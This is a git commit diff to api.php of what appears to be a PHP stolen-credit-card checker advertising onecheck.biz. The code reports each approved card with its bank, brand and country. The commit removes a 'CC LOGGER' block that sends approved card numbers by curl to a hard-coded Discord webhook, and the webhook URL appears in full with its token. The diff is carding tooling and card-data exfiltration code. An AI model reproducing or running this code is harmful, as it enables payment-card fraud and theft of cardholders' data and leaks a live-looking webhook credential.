860473b1666303d9d21991df80f2150edbe515ab
EndStar <31290172+EndStarr@users.noreply.github.com>
2021-04-05 10:08:43 +0300

    Api güncellendi
    api güncellendi

--- api.php
+++ api.php
@@ -176,58 +176,7 @@ if(strpos($result, '"status":0')) {
 }elseif(strpos($result, '"status":1')){
     
     echo '<h7> #Onaylandı | Ödeme başarılı - '.$lista.' - '.$bank.', '.$scheme.', '.$brand.', '.$country.' - '.$time.' - www.onecheck.biz </br> </h7> ';
-    $webhookurl = "https://discord.com/api/webhooks/813858111831146548/AkKNJ284l4VeKs0XMh4-gkqifz5vtxZys-G6clE2egTqx_VTnm9AolyBq87CwMSFW-xl";
-
-$timestamp = date("c", strtotime("now"));
-
-$json_data = json_encode([
-
-    "username" => "CC LOGGER",
-
-    "avatar_url" => "https://cdn.discordapp.com/attachments/798621683468599296/809547689141862480/logo.png",
-
-    "tts" => false,
-
-    // "file" => "",
-    "embeds" => [
-        [
-            "type" => "rich",
-
-            "description" => "Ödeme Onaylandı Kart Numarası `$lista`",
-
-            "timestamp" => $timestamp,
-
-            "color" => hexdec( "060818" ),
-
-            "author" => [
-                "name" => "Ödeme Onaylandı",
-                
-            ],
-
-            "fields" => [
-                [
-                    "name" => "Checklenen Pos",
-                    "value" => "Türkiye Pos",
-                    "inline" => false
-                ],
-              
-            ]
-        ]
-    ]
-
-], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
-
-$ch = curl_init( $webhookurl );
-curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
-curl_setopt( $ch, CURLOPT_POST, 1);
-curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
-curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt( $ch, CURLOPT_HEADER, 0);
-curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
-
-$response = curl_exec( $ch );
-
-curl_close( $ch );
+  
     
 }else{
     
